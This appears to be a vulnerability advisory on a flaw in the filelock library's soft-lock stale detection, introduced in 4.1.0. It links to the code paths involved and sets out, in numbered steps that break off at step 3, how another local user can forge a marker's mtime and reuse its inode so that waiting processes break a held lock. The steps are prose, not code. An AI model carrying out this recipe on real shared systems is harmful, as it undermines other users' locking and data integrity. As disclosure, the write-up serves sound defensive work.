At the scanned commit b831496, the watch is [`SoftFileLock._marker_unchanged_for`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L125-L132), with its caller in [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123). The [`MarkerSoftFileLock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_marker.py#L74-L81) and [`SoftFileLease`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_lease.py#L229-L256) paths hand an unparsable marker to the same code. The re-check in [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L113-L118) compares the values the contender just read.

## Introduced

0f7c4d3794dc ("fix(soft): expire leases on the contender's clock", #796, 2026-10-07), first released in 4.1.0 (verified against the tags). Earlier releases compared the marker's mtime with the wall clock, and this does not affect them.

## Mechanism

`SoftFileLock._acquire` creates the marker with `O_CREAT | O_EXCL` (create the file, fail if it exists) and only then writes the holder record. In between it calls `fstat` and `uname`, stats `/proc/self/ns/pid` and reads `/proc/<pid>/stat`, so for about 75 µs (measured) the marker exists and is empty. A contender that polls in that gap must not take the marker for garbage, and the check that protects it is the two-second watch. `_try_break_stale_lock` reads the marker, finds no holder, and calls `break_lock_file(lock_file, mtime, ino)` only if `_marker_unchanged_for(mtime, ino)` reaches `MALFORMED_LOCK_AGE_THRESHOLD` (2.0 s). That function keeps `self._marker_seen = ((mtime, ino), first seen)` across polls and returns the elapsed monotonic time (time from a clock that only moves forward) while the pair repeats.

Neither half of the pair belongs to one file. A file's owner sets its mtime to any value with `utime`, a future time included, and ext4 gives the inode number of an unlinked file to the next file created in the directory.

1. While the lock is free, the other user creates an empty file at the lock path (inode `I`) and sets its mtime to `T`, a tick of the coarse clock about 2.2 s in the future.
2. Every waiting process of the lock user polls each 50 ms, reads an empty file and records `_marker_seen = ((T, I), first seen)`. After 2 s each poll calls `break_lock_file`, whose `rename` fails with `EPERM` (operation not permitted; seen with `strace`): the directory is sticky and the file belongs to the other user. `suppress(OSError, ...)` swallows the error, the file stays, and nothing resets `_marker_seen`.
3. When the coarse clock reaches `T`, the other user unlinks its file. Inode `I` is free.
